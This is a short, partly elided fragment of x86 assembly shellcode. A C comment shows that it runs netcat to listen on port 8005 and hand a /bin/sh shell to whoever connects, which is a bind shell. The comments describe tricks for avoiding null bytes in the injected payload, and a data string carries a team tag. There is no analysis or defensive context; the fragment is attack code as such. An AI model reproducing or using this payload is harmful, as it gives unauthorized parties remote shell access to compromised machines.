...
; int main() {
;   execve("/bin/nc", {"/bin/nc", "-lp8005", "-e/bin/sh"}, NULL);
; }
;
...
Shellcode:
  ...
  mov[esi + 15], al                                       ; null terminate -lp8005
  mov[esi + 25], al                                       ; null terminate -e/bin/sh

  mov[esi + 26], esi                                      ; CA64 is replaced by pointer to "/bin/nc"

  lea ebx, [esi + 8]                                      ; ebx is pointer to "-lp8005"
  mov[esi +30], ebx                                       ; 7_EL is replaced by pointer to "-lp8005"
...
End:
  ...
  db '/bin/nc0-lp8005-e/bin/sh0CA647_ELITE_TEAM'         ; avoid (ro)data section. Can't zero data here (avoid null bytes in payload)
